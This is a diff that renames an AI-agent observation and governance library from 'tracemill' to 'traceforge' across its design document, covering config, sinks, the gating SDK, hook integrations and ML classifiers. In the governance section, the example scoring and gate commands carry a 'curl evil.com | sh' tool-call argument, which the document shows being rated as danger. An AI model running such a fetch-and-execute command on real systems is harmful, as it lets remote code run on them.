@@ -1,8 +1,8 @@
-# tracemill
+# traceforge
 
 *Agent event observation pipeline with pluggable storage backends.*
 
-Mills raw agent traces into structured, classified, risk-scored output.
+Forges raw agent traces into structured, classified, risk-scored output.
 
 ---
 
@@ -10,7 +10,7 @@ Mills raw agent traces into structured, classified, risk-scored output.
 
 A standalone Python library that **observes AI agent sessions** across any framework and routes structured events to pluggable storage backends. It is the observation-to-storage pipeline — the plumbing layer between "agent did something" and "that knowledge lives somewhere useful."
 
-tracemill is framework-agnostic. Adding support for a new agent framework requires only a YAML mapping file — no Python code. It ships with 15 bundled mappings covering the most common agent frameworks and supports arbitrary extensions via user-defined mappings.
+traceforge is framework-agnostic. Adding support for a new agent framework requires only a YAML mapping file — no Python code. It ships with 15 bundled mappings covering the most common agent frameworks and supports arbitrary extensions via user-defined mappings.
 
 The library handles the full data lifecycle:
 1. **Sources** transport raw data from files, HTTP endpoints, SSE streams, SQLite databases, or replays
@@ -27,7 +27,7 @@ Known consumers:
 
 ### Extraction Lineage
 
-tracemill was extracted from CodePlane as a standalone library. CodePlane's observation logic was tightly coupled to its UI; tracemill decouples the pipeline so any consumer can subscribe to agent events without importing CodePlane's domain concerns.
+traceforge was extracted from CodePlane as a standalone library. CodePlane's observation logic was tightly coupled to its UI; traceforge decouples the pipeline so any consumer can subscribe to agent events without importing CodePlane's domain concerns.
 
 ---
 
@@ -446,7 +446,7 @@ tool.call.started  → motivation = ToolMotivation(
 | MAF (OTel) | *(none — spans lack content)* | — | — |
 | LangGraph | *(none — no assistant events)* | — | — |
 
-### Bundled Mappings (22 files in `src/tracemill/mappings/`)
+### Bundled Mappings (22 files in `src/traceforge/mappings/`)
 
 | File | Framework | Notes |
 |------|-----------|-------|
@@ -477,8 +477,8 @@ tool.call.started  → motivation = ToolMotivation(
 
 Search order (first match wins):
 1. User-specified dirs (from `config.mappings_dirs`)
-2. `~/.tracemill/mappings/` (default user dir)
-3. Bundled mappings (`src/tracemill/mappings/`)
+2. `~/.traceforge/mappings/` (default user dir)
+3. Bundled mappings (`src/traceforge/mappings/`)
 
 User mappings override bundled ones with the same name.
 
@@ -819,7 +819,7 @@ class StorageSink(ABC):
 
 | Sink | Status | Description |
 |------|--------|-------------|
-| `CallbackSink` | ✅ Done | Delegates to user-provided async callables. For SDK/library consumers that embed tracemill in Python. |
+| `CallbackSink` | ✅ Done | Delegates to user-provided async callables. For SDK/library consumers that embed traceforge in Python. |
 | `SqliteSink` | ✅ Done | Local SQLite storage with WAL mode, schema migration, batch inserts. Configured via `type: sqlite` in YAML. |
 | `JsonlSink` | ✅ Done | Append-only JSONL files with optional size-based rotation. Configured via `type: jsonl` in YAML. |
 | `S3Sink` | ✅ Done | Cloud object storage with buffered upload and key formatting. Configured via `type: s3` in YAML. Requires `boto3` (optional dep). |
@@ -850,7 +850,7 @@ sinks:
 ### Root Config (`config/models.py`)
 
 `python
-class TracemillConfig(StrictModel):
+class TraceforgeConfig(StrictModel):
     log_level: Literal["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"] = "INFO"
     mappings_dirs: list[Path] = []           # additional mapping search paths
     pipelines: list[PipelineConfig] = []     # named source→adapter→sinks pipelines
@@ -877,7 +877,7 @@ class PipelineConfig(StrictModel):
 **Sources** (discriminator: `type`):
 `FileWatchSourceConfig`, `FilePollSourceConfig`, `HttpPollSourceConfig`, `SSESourceConfig`, `ReplaySourceConfig`
 
-> Note: `SqliteSource` is implemented but not yet exposed in the config union. It is used programmatically (e.g., by CopilotPreParser) rather than instantiated from `tracemill.yaml`.
+> Note: `SqliteSource` is implemented but not yet exposed in the config union. It is used programmatically (e.g., by CopilotPreParser) rather than instantiated from `traceforge.yaml`.
 
 **Adapters** (discriminator: `type`):
 `MappedJsonAdapterConfig`, `OtelSpanAdapterConfig`
@@ -889,25 +889,25 @@ class PipelineConfig(StrictModel):
 
 From highest to lowest priority:
 1. Constructor kwargs passed to `load_config()`
-2. Environment variables (`TRACEMILL_*` prefix, `__` for nesting)
-3. `TRACEMILL_CONFIG` env var (explicit path override)
-4. Project-local: `./tracemill.yaml`
-5. User-global: `~/.tracemill/config.yaml`
+2. Environment variables (`TRACEFORGE_*` prefix, `__` for nesting)
+3. `TRACEFORGE_CONFIG` env var (explicit path override)
+4. Project-local: `./traceforge.yaml`
+5. User-global: `~/.traceforge/config.yaml`
 6. Built-in defaults
 
 ### Bootstrap
 
-On first config access, `~/.tracemill/` is auto-created with:
+On first config access, `~/.traceforge/` is auto-created with:
 - `config.yaml` (default configuration template)
 - `mappings/` (directory for user custom mappings)
 
-No separate `tracemill init` command needed.
+No separate `traceforge init` command needed.
 
 ### Environment Variables
 
-- `TRACEMILL_CONFIG` — explicit config file path
-- `TRACEMILL_LOG_LEVEL` — scalar override
-- `TRACEMILL_SDK__BATCH_SIZE` — nested override (double underscore = nesting)
+- `TRACEFORGE_CONFIG` — explicit config file path
+- `TRACEFORGE_LOG_LEVEL` — scalar override
+- `TRACEFORGE_SDK__BATCH_SIZE` — nested override (double underscore = nesting)
 
 ---
 
@@ -918,9 +918,9 @@ No separate `tracemill init` command needed.
 **Done:**
 - `OtelSink` (`OtelExporterSink`) exports events / spans / usage / title-updates to an OpenTelemetry collector via **OTLP/HTTP JSON**. It is intentionally hand-rolled with **no `opentelemetry-sdk` dependency** (simplified OTLP JSON, not protobuf) to stay lightweight — this is a settled design decision, not a gap.
 - Span generation from tool-call pairs (enricher pairing + `TelemetrySpan` + `OtelExporterSink._event_to_span`).
-- Pipeline-level **self-metrics** (`tracemill.telemetry`): `PipelineMetrics` is an opt-in, in-process accumulator attached via `EventPipeline(..., metrics=PipelineMetrics())`. It records throughput (events/sec), enrichment latency, per-sink write time, and dropped / failed-sink counts, read back as an immutable `MetricsSnapshot` (surfaced on `flush()` / `close()`, and logged at DEBUG on flush).
+- Pipeline-level **self-metrics** (`traceforge.telemetry`): `PipelineMetrics` is an opt-in, in-process accumulator attached via `EventPipeline(..., metrics=PipelineMetrics())`. It records throughput (events/sec), enrichment latency, per-sink write time, and dropped / failed-sink counts, read back as an immutable `MetricsSnapshot` (surfaced on `flush()` / `close()`, and logged at DEBUG on flush).
   - **Disabled path is a true no-op.** Without a `metrics=` instance the hot path makes **no timing calls and no metrics allocations** — every instrumentation site is guarded on `metrics is not None`, and the sink fan-out takes its original unwrapped path. This is enforced by a test that spies on `time.perf_counter` and asserts zero calls on the disabled path.
-  - **No metrics-framework dependency.** Deliberately **no `opentelemetry-sdk`** and **no `prometheus`** — no background threads, no parallel transport, no unbounded accumulation (state is bounded: scalar counters plus one entry per sink). This mirrors the hand-rolled OTLP decision above: tracemill's self-observability is a plain accumulator, not a vendored SDK.
+  - **No metrics-framework dependency.** Deliberately **no `opentelemetry-sdk`** and **no `prometheus`** — no background threads, no parallel transport, no unbounded accumulation (state is bounded: scalar counters plus one entry per sink). This mirrors the hand-rolled OTLP decision above: traceforge's self-observability is a plain accumulator, not a vendored SDK.
 
 ---
 
@@ -938,7 +938,7 @@ pipeline.unsubscribe(sink) -> bool
 ```
 
 - `subscribe` wraps `on_event` in a `CallbackSink` and appends it to the fan-out; it returns that sink, which doubles as the handle for `unsubscribe`.
-- `on_event` may be **async or a plain sync callable** — the one genuinely new capability. Sync callbacks run inline on the event loop by default (right for append-to-list / put-on-queue consumers); pass `to_thread=True` to run a blocking callback via `asyncio.to_thread` so it never stalls the loop. (Adapter: `tracemill.sinks.callback.as_async_event_callback`.)
+- `on_event` may be **async or a plain sync callable** — the one genuinely new capability. Sync callbacks run inline on the event loop by default (right for append-to-list / put-on-queue consumers); pass `to_thread=True` to run a blocking callback via `asyncio.to_thread` so it never stalls the loop. (Adapter: `traceforge.sinks.callback.as_async_event_callback`.)
 - `kind` is an optional per-subscriber filter checked **before** dispatch: an exact kind, a `"prefix.*"` wildcard (e.g. `"tool.*"`), an iterable of those, or a predicate over the event.
 
 `EventPipeline(sinks=[CallbackSink(on_event=handler)])` remains equivalent for construction-time wiring; `subscribe` is the ergonomic path for adding/removing consumers on a live pipeline — no sink subclassing, no flush/close lifecycle, no persistence contract.
@@ -978,7 +978,7 @@ pipeline.unsubscribe(sink) -> bool
 ## §18 — Repository Structure
 
 `
-tracemill/
+traceforge/
 ├── .github/
 │   ├── copilot-setup-steps.yml
 │   └── workflows/
@@ -987,9 +987,9 @@ tracemill/
 │       ├── publish.yml
 │       ├── tool-surface-audit.yml
 │       └── weekly-compat-audit.yml
-├── src/tracemill/
+├── src/traceforge/
 │   ├── __init__.py              # Public API surface
-│   ├── __main__.py              # `python -m tracemill`
+│   ├── __main__.py              # `python -m traceforge`
 │   ├── _generated.py            # Generated EventKind constants
 │   ├── models.py                # StrictModel, FrozenModel bases
 │   ├── types.py                 # EventKind, SessionEvent, EventMetadata, TitleUpdate, etc.
@@ -1011,7 +1011,7 @@ tracemill/
 │   │   ├── sse.py               # SSESource (WHATWG spec)
 │   │   ├── sqlite.py            # SqliteSource (row polling)
 │   │   ├── replay.py            # ReplaySource (one-shot)
-│   │   └── auto_detect.py       # Framework auto-detection helper (backs `tracemill detect`; not a Source)
+│   │   └── auto_detect.py       # Framework auto-detection helper (backs `traceforge detect`; not a Source)
 │   ├── sinks/
 │   │   ├── __init__.py
 │   │   ├── base.py              # StorageSink ABC
@@ -1074,7 +1074,7 @@ tracemill/
 │   │       └── verb_inference.yaml
 │   ├── config/
 │   │   ├── __init__.py
-│   │   ├── models.py            # TracemillConfig, PipelineConfig, unions
+│   │   ├── models.py            # TraceforgeConfig, PipelineConfig, unions
 │   │   ├── loader.py            # Hierarchical config loading
 │   │   ├── defaults.py          # Default config template
 │   │   └── mappings.py          # Mapping file resolver
@@ -1132,7 +1132,7 @@ tracemill/
 │   │   ├── hygiene.py
 │   │   ├── naming.py            # HeuristicProvider / ApiProvider / build_session_titler
 │   │   ├── _resolve.py
-│   │   └── data/                # boilerplate_files.json (title hygiene); segment-titler ONNX model ships separately in the tracemill-title-model package
+│   │   └── data/                # boilerplate_files.json (title hygiene); segment-titler ONNX model ships separately in the traceforge-title-model package
 │   ├── tracking/                # Deterministic phase segmenter (research signal, not live path)
 │   │   ├── __init__.py
 │   │   ├── models.py
@@ -1163,7 +1163,7 @@ tracemill/
 │   │   ├── canonical.py         # Canonical event hashing
 │   │   ├── envelope.py          # EnrichedEvent, ContextGapEvent
 │   │   ├── emitter.py           # EnrichedEmitter (async audit emission + backpressure)
-│   │   ├── observer.py          # TracemillObserver adapter
+│   │   ├── observer.py          # TraceforgeObserver adapter
 │   │   └── persistence.py       # SystemStore (SQLite persistence)
 │   ├── sdk/                     # Pipeline + gating SDK
 │   │   ├── __init__.py          # Pipeline, EventTrace, Verdict, GatePolicy re-exports
@@ -1187,17 +1187,17 @@ tracemill/
 │   │   ├── models.py
 │   │   ├── script.py.mako
 │   │   └── versions/
-│   └── cli/                     # Click CLI (entry point tracemill.cli:main)
+│   └── cli/                     # Click CLI (entry point traceforge.cli:main)
 │       ├── __init__.py          # Command group: "governance pipeline for AI coding agents"
-│       ├── watch.py             # tracemill watch          (config-driven live pipeline)
-│       ├── replay.py            # tracemill replay         (one-shot file reprocess)
-│       ├── score.py             # tracemill score          (preflight scoring HTTP server)
-│       ├── gate_cmd.py          # tracemill gate           (apply a gate policy)
-│       ├── detect.py            # tracemill detect         (framework auto-detection)
-│       ├── config_cmd.py        # tracemill config         (inspect / emit config)
-│       ├── status.py            # tracemill status         (environment / model status)
-│       ├── init_cmd.py          # tracemill init           (scaffold ~/.tracemill)
-│       ├── download_cmd.py      # tracemill download-model
+│       ├── watch.py             # traceforge watch          (config-driven live pipeline)
+│       ├── replay.py            # traceforge replay         (one-shot file reprocess)
+│       ├── score.py             # traceforge score          (preflight scoring HTTP server)
+│       ├── gate_cmd.py          # traceforge gate           (apply a gate policy)
+│       ├── detect.py            # traceforge detect         (framework auto-detection)
+│       ├── config_cmd.py        # traceforge config         (inspect / emit config)
+│       ├── status.py            # traceforge status         (environment / model status)
+│       ├── init_cmd.py          # traceforge init           (scaffold ~/.traceforge)
+│       ├── download_cmd.py      # traceforge download-model
 │       ├── runner.py            # Shared pipeline runner
 │       └── factory.py           # Source / adapter / sink construction from config
 ├── tests/
@@ -1259,9 +1259,9 @@ tracemill/
 
 ## §19 — Design Constraints
 
-1. **Pure observation** — tracemill observes, enriches, and delivers. It never modifies agent behavior, injects prompts, or manages processes.
+1. **Pure observation** — traceforge observes, enriches, and delivers. It never modifies agent behavior, injects prompts, or manages processes.
 
-2. **Zero-code configuration** — users configure tracemill entirely through YAML and environment variables. Adding a framework = new YAML mapping. Choosing sinks = YAML config. No Python code required for normal operation.
+2. **Zero-code configuration** — users configure traceforge entirely through YAML and environment variables. Adding a framework = new YAML mapping. Choosing sinks = YAML config. No Python code required for normal operation.
 
 3. **Defensive parsing** — adapters/parsers never crash. Unknown fields are ignored. Malformed input is logged and skipped.
 
@@ -1350,11 +1350,11 @@ tracemill/
 | Risk scoring | ✅ Complete | Structural + flags + injection + taint + context. MITRE mappings. |
 | EventPipeline | ✅ Complete | Fan-out, error isolation, enricher integration |
 | Storage sinks (8) | ✅ Complete | Callback, Console, Jsonl, Sqlite, S3, Parquet, OtelExporter, Webhook |
-| Telemetry self-metrics | ✅ Complete | `tracemill.telemetry.PipelineMetrics`: opt-in `EventPipeline(metrics=...)` accumulator — throughput, enrichment latency, per-sink write time, dropped / failed-sink counts, immutable `MetricsSnapshot`. Disabled path is a true no-op (no timers/allocs on the hot path); no `opentelemetry-sdk` / `prometheus` dep. §14. Closed #48 |
+| Telemetry self-metrics | ✅ Complete | `traceforge.telemetry.PipelineMetrics`: opt-in `EventPipeline(metrics=...)` accumulator — throughput, enrichment latency, per-sink write time, dropped / failed-sink counts, immutable `MetricsSnapshot`. Disabled path is a true no-op (no timers/allocs on the hot path); no `opentelemetry-sdk` / `prometheus` dep. §14. Closed #48 |
 | EventBus subscribe / pub-sub | ✅ Complete | `EventPipeline.subscribe(on_event, *, kind=None, to_thread=False)` + `unsubscribe()` over the error-isolated fan-out; sync-or-async callbacks, optional per-subscriber `kind` filter. §15. Closed #47 |
 | CLI | ✅ Complete | `cli/` (Click): watch, replay, score, gate, detect, config, status, init, download-model |
 | Gate module | ✅ Complete | Sync scoring path + PII gate + registry (`gate/`, `gates/`) |
-| Live structuring (phase / boundary / title) | ✅ Complete | CPU-only, torch-free. Phase + boundary sklearn heads (joblib) over a frozen model2vec embedder, default-on, stamp `metadata.phase` / `metadata.boundary` live; T5 titler (int8 split-ONNX, opt-in) emits out-of-band `TitleUpdate`. Titler weights ship in the separate `tracemill-title-model` package. See §23 |
+| Live structuring (phase / boundary / title) | ✅ Complete | CPU-only, torch-free. Phase + boundary sklearn heads (joblib) over a frozen model2vec embedder, default-on, stamp `metadata.phase` / `metadata.boundary` live; T5 titler (int8 split-ONNX, opt-in) emits out-of-band `TitleUpdate`. Titler weights ship in the separate `traceforge-title-model` package. See §23 |
 | Governance / assessment engine | ✅ Complete | `governance/` monitor + shield object model (SOLID): `SessionMonitor` (single writer), `Scorer` (read-only preview), `SessionRegistry`, `Assessor`, `Shield`, one-counter `SessionState`, `GovernancePipeline` facade; plus labeler, rules, PII, IFC, integrity, drift, budget, observer, emitter, persistence. Epic #7 (stories #9–#27) fully delivered and closed. See §22 |
 | Configuration system | ✅ Complete | Hierarchical loading, env overrides, discriminated unions, bootstrap |
 | Classify data files (10 YAMLs) | ✅ Complete | Binary info, verb/shell/effect rules, MCP profiles, tool classifications, risk config, governance recommendation rules |
@@ -1365,7 +1365,7 @@ tracemill/
 
 | Item | Priority | Dependencies | Notes |
 |------|----------|--------------|-------|
-| **PyPI release** | Medium | None | Publish `tracemill` + `tracemill-title-model` to PyPI. Packaging and CI publish workflow are already in place. |
+| **PyPI release** | Medium | None | Publish `traceforge` + `traceforge-title-model` to PyPI. Packaging and CI publish workflow are already in place. |
 
 > **Delivered since this table was first written:** the live structuring subsystem
 > (`phase/` + `boundary/` + `title/`, formerly PR #35, now specified in §23) and the
@@ -1376,7 +1376,7 @@ tracemill/
 ### Implementation Order (Recommended)
 
 `
-1. PyPI release → publish tracemill + tracemill-title-model
+1. PyPI release → publish traceforge + traceforge-title-model
 `
 
 ---
@@ -1388,7 +1388,7 @@ the same assessment. Objects with single responsibilities, wired by dependency i
 
 ### Scope
 
-tracemill observes, parses, enriches, classifies, risk-scores, and structures agent events
+traceforge observes, parses, enriches, classifies, risk-scores, and structures agent events
 (§9–§11). **Governance is neither a separate track nor the whole pipeline** — it is a *runtime
 monitor* over a session's event trace, plus an optional *shield* (runtime enforcement) at the
 framework's execution boundary.
@@ -1515,11 +1515,11 @@ deterministic heuristics. Replay injects a "captured-value" inferencer and reach
 state. (Dependency Inversion applied to time: the *source* of a value is a dependency, so live
 and replay differ only in which implementation is injected.)
 
-### The SDK facade: `tracemill.sdk.Pipeline`
+### The SDK facade: `traceforge.sdk.Pipeline`
 
-The SDK's top-level entry point composes tracemill's two halves into one object:
+The SDK's top-level entry point composes traceforge's two halves into one object:
 
-* the **observation backbone** (`tracemill.pipeline.EventPipeline`) — enrich → classify →
+* the **observation backbone** (`traceforge.pipeline.EventPipeline`) — enrich → classify →
   ML-structure (phase / boundary / title) → sinks, and
 * the **governance engine** (`GovernancePipeline`) — the monitor (+ optional shield).
 
@@ -1528,8 +1528,8 @@ Governance is wired in as **one stage**: when enabled, each pushed event is obse
 with or without it.
 
 ```python
-from tracemill.sdk import Pipeline
-from tracemill.sinks.jsonl import JsonlSink
+from traceforge.sdk import Pipeline
+from traceforge.sinks.jsonl import JsonlSink
 
 # Observe a stream: enrich -> classify -> structure -> observe -> emit
 async with Pipeline.create(sinks=[JsonlSink("events.jsonl")]) as pipeline:
@@ -1548,7 +1548,7 @@ Pipeline.from_config(path=None, *, policy=None, sinks=None, ...) -> Pipeline
 ```
 
 * `config` — a `GovernanceConfig` for the engine (in-memory DB + defaults when omitted).
-  `from_config` loads it from a `tracemill.yaml` instead.
+  `from_config` loads it from a `traceforge.yaml` instead.
 * `policy` — a `GatePolicy` enabling the shield (the `gate_*` helpers). Omit for
   observation-only usage.
 * `sinks` — observation destinations for pushed events. Omit for gating-only usage.
@@ -1573,7 +1573,7 @@ use go straight to it; the SDK facade delegates to it. It constructs the `Sessio
 to them.
 
 ```python
-from tracemill.governance.pipeline import GovernancePipeline
+from traceforge.governance.pipeline import GovernancePipeline
 
 gov = GovernancePipeline.create()   # zero-config; or pass GovernanceConfig / policy=
 
@@ -1587,7 +1587,7 @@ trace = gov.score_tool_call({
 # trace.suggested_action == "escalate"; trace.reason == "risk_score_danger"
 ```
 
-`EventTrace` (`tracemill.trace`) is the unified pipeline record — identity, classification, and
+`EventTrace` (`traceforge.trace`) is the unified pipeline record — identity, classification, and
 assessment on one frozen object (abridged):
 
 ```python
@@ -1612,12 +1612,12 @@ class EventTrace:
     stage: TraceStage                          # adapted -> classified -> assessed
 ```
 
-`SessionMeta` (`tracemill.governance.results`) is the richer stateful output attached to
+`SessionMeta` (`traceforge.governance.results`) is the richer stateful output attached to
 `event.metadata.governance`: `classification`, `risk_assessment`, `recommendation` (a
 `RiskRecommendation` with `.recommended_action`, `.reason_code`, `.transform`), `budget_snapshot`,
 `drift`, `mcp_alerts`, `evidence`.
 
-The recommendation enum (`tracemill.governance.results`):
+The recommendation enum (`traceforge.governance.results`):
 
 ```python
 class RecommendedAction(StrEnum):
@@ -1640,8 +1640,8 @@ Every event pushed through the pipeline is enriched, classified, optionally stru
 and emitted with its `SessionMeta` on `metadata.governance`. A `CallbackSink` can react to each:
 
 ```python
-from tracemill.sdk import Pipeline
-from tracemill import CallbackSink
+from traceforge.sdk import Pipeline
+from traceforge import CallbackSink
 
 async def on_enriched_event(event):
     meta = event.metadata.governance if event.metadata else None
@@ -1661,7 +1661,7 @@ the callback fires regardless of sink configuration.
 When a framework hook fires and the consumer needs an immediate assessment:
 
 ```python
-from tracemill.governance.pipeline import GovernancePipeline
+from traceforge.governance.pipeline import GovernancePipeline
 
 gov = GovernancePipeline.create()
 
@@ -1680,7 +1680,7 @@ taint / drift are untouched. `observe_event()` is the observation counterpart th
 
 ```bash
 # Preflight scoring server: POST /score, GET /health. Body uses "arguments".
-tracemill score --listen localhost:7331
+traceforge score --listen localhost:7331
 curl -s localhost:7331/score \
   -d '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}'
 # -> {"risk_assessment": {"score": 72, "level": "danger"},
@@ -1690,17 +1690,17 @@ curl -s localhost:7331/score \
 # Hook relay: read a tool-call event on stdin, ask the running pipeline's IPC server for a
 # verdict, print it in the framework's format (e.g. Claude Code PreToolUse).
 echo '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}' \
-  | tracemill gate --stdin --format claude-code
+  | traceforge gate --stdin --format claude-code
 
 # Run the full config-driven observation pipeline (governance stamped on every event).
-tracemill watch
+traceforge watch
 
 # Re-run the full pipeline over recorded traces.
-tracemill replay ./traces --adapter copilot
+traceforge replay ./traces --adapter copilot
 ```
 
-`tracemill score` serves read-only assessments (monitor only); `tracemill gate` returns an
-enforced verdict from a pipeline whose `Shield` has a `GatePolicy`; `tracemill watch` / `replay`
+`traceforge score` serves read-only assessments (monitor only); `traceforge gate` returns an
+enforced verdict from a pipeline whose `Shield` has a `GatePolicy`; `traceforge watch` / `replay`
 run the unified observe → structure → govern → sinks pipeline.
 
 ### Integration Patterns
@@ -1711,7 +1711,7 @@ The SDK composes a `GatePolicy` (preflight/postflight callbacks returning a `Ver
 pipeline's `Shield`, then binds it to a framework with one call:
 
 ```python
-from tracemill.sdk import Pipeline, GatePolicy, Verdict, ToolCallRequest, GateContext
+from traceforge.sdk import Pipeline, GatePolicy, Verdict, ToolCallRequest, GateContext
 
 def preflight(request: ToolCallRequest, ctx: GateContext) -> Verdict:
     if request.risk_score and request.risk_score > 60:
@@ -1732,13 +1732,13 @@ exist directly on `GovernancePipeline` for gating-only use.)
 
 #### Shell hook (Copilot / Claude Code CLI)
 
-The consumer's hook script pipes the tool-call event to `tracemill gate`, which relays it to the
+The consumer's hook script pipes the tool-call event to `traceforge gate`, which relays it to the
 running pipeline's IPC server and prints a verdict in the framework's format:
 
 ```bash
 #!/bin/bash
 # Claude Code PreToolUse hook — consumer's script
-echo "$TOOL_EVENT_JSON" | tracemill gate --stdin --format claude-code
+echo "$TOOL_EVENT_JSON" | traceforge gate --stdin --format claude-code
 # the JSON/exit-code verdict is consumed by the agent's native hook contract
 ```
 
@@ -1747,7 +1747,7 @@ echo "$TOOL_EVENT_JSON" | tracemill gate --stdin --format claude-code
 Consumers that prefer to interpret recommendations themselves can score and branch:
 
 ```python
-from tracemill.governance.pipeline import GovernancePipeline
+from traceforge.governance.pipeline import GovernancePipeline
 
 gov = GovernancePipeline.create()
 
@@ -1760,9 +1760,9 @@ async def can_use_tool(tool_name, input_data, session_id):
     return trace.suggested_action not in ("deny", "escalate", "transform")
 ```
 
-### What tracemill Owns vs What the Consumer Owns
+### What traceforge Owns vs What the Consumer Owns
 
-| tracemill | Consumer |
+| traceforge | Consumer |
 |-----------|----------|
 | Observation pipeline (always-on) | Which events / sources to observe |
 | Event parsing (framework mappings) | Escalation flow (human-in-the-loop) |
@@ -1777,12 +1777,12 @@ async def can_use_tool(tool_name, input_data, session_id):
 
 ```
 1. Agent session starts
-2. tracemill observation pipeline starts (reads from configured source)
+2. traceforge observation pipeline starts (reads from configured source)
 3. Events stream in -> parse -> enrich -> classify -> structure -> observe (monitor stage)
    • SessionState advances once per real tool call — the single writer, single counter
    • Each emitted event carries its SessionMeta on metadata.governance; sinks persist
 4. IF a Shield (GatePolicy) is registered AND a pre-execution hook fires:
-   a. Hook relays the pending call (score_tool_call / tracemill gate)
+   a. Hook relays the pending call (score_tool_call / traceforge gate)
    b. Monitor scores it read-only against current session state
    c. GatePolicy maps the recommendation to a Verdict (allow / deny)
    d. Shield enforces via the framework's native mechanism, records the outcome in SessionState
@@ -1803,14 +1803,14 @@ its source via `observe_event` (confirming execution):
 Blocked calls therefore never corrupt budget / taint state. The monitor is the single source of
 truth for state mutations.
 
-### Configuration (`tracemill.yaml`)
+### Configuration (`traceforge.yaml`)
 
 The `governance` section configures the monitor + assessor. Same shape in YAML and SDK:
 
 ```yaml
-# tracemill.yaml
+# traceforge.yaml
 governance:
-  db_path: ./tracemill.db
+  db_path: ./traceforge.db
   project_root: .
   pii_scanning: true
   rules_path: null          # null = bundled defaults
@@ -1837,11 +1837,11 @@ pipelines:
 SDK equivalent (no YAML needed):
 
 ```python
-from tracemill.config import GovernanceConfig, BudgetConfig
-from tracemill.governance.pipeline import GovernancePipeline
+from traceforge.config import GovernanceConfig, BudgetConfig
+from traceforge.governance.pipeline import GovernancePipeline
 
 gov = GovernancePipeline.create(GovernanceConfig(
-    db_path="./tracemill.db",
+    db_path="./traceforge.db",
     project_root=".",
     pii_scanning=True,
     budget=BudgetConfig(max_tool_calls=200, max_by_effect={"destructive": 10}),
@@ -1873,13 +1873,13 @@ enforcement decisions.
 
 | # | Platform | Hook type | Consumer entry point | Gateable? |
 |---|----------|-----------|----------------------|-----------|
-| 1 | **Copilot CLI** | Shell script | `tracemill gate --stdin` | ✓ |
-| 2 | **Copilot Cloud** | Shell script | `tracemill gate --stdin` | ✓ |
+| 1 | **Copilot CLI** | Shell script | `traceforge gate --stdin` | ✓ |
+| 2 | **Copilot Cloud** | Shell script | `traceforge gate --stdin` | ✓ |
 | 3 | **Copilot SDK** | In-process | `pipeline.score_tool_call(...)` | ✓ |
-| 4 | **Claude Code CLI** | Shell script | `tracemill gate --stdin --format claude-code` | ✓ |
+| 4 | **Claude Code CLI** | Shell script | `traceforge gate --stdin --format claude-code` | ✓ |
 | 5 | **Claude Code SDK** | In-process | `pipeline.score_tool_call(...)` | ✓ |
-| 6 | **Cline** | Shell script | `tracemill gate --stdin` | ✓ |
-| 7 | **OpenHands** | Shell script | `tracemill gate --stdin` | ✓ |
+| 6 | **Cline** | Shell script | `traceforge gate --stdin` | ✓ |
+| 7 | **OpenHands** | Shell script | `traceforge gate --stdin` | ✓ |
 | 8 | **Goose** | In-process | `pipeline.score_tool_call(...)` | ✓ |
 | 9 | **OpenCode** | In-process | `pipeline.score_tool_call(...)` | ✓ |
 | 10 | **LangGraph / LangChain** | In-process | `pipeline.gate_langchain(tool)` | ✓ |
@@ -1890,13 +1890,13 @@ enforcement decisions.
 | 15 | **smolagents** | Class wrap | `pipeline.gate_smolagents()` | ✓ |
 | 16 | **SWE-agent** | None | — | ✗ (observation only) |
 
-Rows 14 and 16 have no pre-execution hook. tracemill observes and scores their events, but no
+Rows 14 and 16 have no pre-execution hook. traceforge observes and scores their events, but no
 consumer can block their tool calls.
 
 ### File Structure
 
 ```
-src/tracemill/
+src/traceforge/
 ├── pipeline.py              # EventPipeline — observation backbone + governance stage
 ├── enricher.py              # Classification + risk enrichment
 ├── trace.py                 # EventTrace, TraceStage (unified record)
@@ -1921,7 +1921,7 @@ src/tracemill/
 │   ├── gate_policy.py       # GatePolicy (Policy strategy)
 │   ├── gate_types.py        # GateContext, ToolCallRequest/Result, PostflightVerdict
 │   └── verdict.py           # Verdict
-├── gate/                    # Cross-process gate IPC (tracemill gate)
+├── gate/                    # Cross-process gate IPC (traceforge gate)
 ├── gates/                   # Bundled detectors (PII)
 ├── classify/                # Classification engine + data/recommendation_rules.yaml
 └── sinks/                   # Storage backends
@@ -1939,9 +1939,9 @@ mid-session and survives `SESSION_ENDED` / `SESSION_PAUSED`.
 
 | Model | Module | Output | Default |
 |-------|--------|--------|---------|
-| Phase classifier | `tracemill.phase` | `metadata.phase` (per event) | on (`enable_phase`) |
-| Boundary decoder | `tracemill.boundary` | `metadata.boundary` + `activity_id` / `step_id` | on (`enable_boundary`) |
-| Titler | `tracemill.title` | `TitleUpdate` records (out-of-band) | off (`enable_title`) |
+| Phase classifier | `traceforge.phase` | `metadata.phase` (per event) | on (`enable_phase`) |
+| Boundary decoder | `traceforge.boundary` | `metadata.boundary` + `activity_id` / `step_id` | on (`enable_boundary`) |
+| Titler | `traceforge.title` | `TitleUpdate` records (out-of-band) | off (`enable_title`) |
 
 ### 23.1 — Shared foundations
 
@@ -1949,7 +1949,7 @@ mid-session and survives `SESSION_ENDED` / `SESSION_PAUSED`.
   [model2vec](https://github.com/MinishLab/model2vec) static embedder, `minishlab/potion-base-8M`
   (256-dimensional). The weights are vendored under `phase/data/potion-base-8M/`; embedding is a pure
   lookup with **zero network access** and no torch. Input text is truncated to `MAX_TEXT_CHARS = 2000`.
-- **Shared featuriser.** `tracemill.phase.features` builds the symbolic + embedded design matrix for
+- **Shared featuriser.** `traceforge.phase.features` builds the symbolic + embedded design matrix for
   **both** models, so there is no train/serve skew and no second feature implementation to drift.
 - **Causal segmentation primitives.** A categorical **Bayesian Online Changepoint Detection** (BOCPD;
   Adams & MacKay 2007 — a Dirichlet-multinomial predictive with a constant hazard) plus trailing neighbor
@@ -1959,7 +1959,7 @@ mid-session and survives `SESSION_ENDED` / `SESSION_PAUSED`.
   imported at runtime.** These ML dependencies are part of the **core** package (not an optional extra)
   and are imported lazily, so an unused subsystem costs nothing.
 
-### 23.2 — Phase classifier (`src/tracemill/phase/`)
+### 23.2 — Phase classifier (`src/traceforge/phase/`)
 
 Stamps `metadata.phase` with the session-aware workflow stage.
 
@@ -1979,16 +1979,16 @@ Stamps `metadata.phase` with the session-aware workflow stage.
   production stamp is the argmax class.
 - **Single producer.** The trained classifier is the **only** phase producer; there is no deterministic
   fallback (a missing model bundle raises rather than silently degrading). The deterministic
-  `tracemill.tracking.PhaseTracker` is a **research feature signal, not part of the live path.**
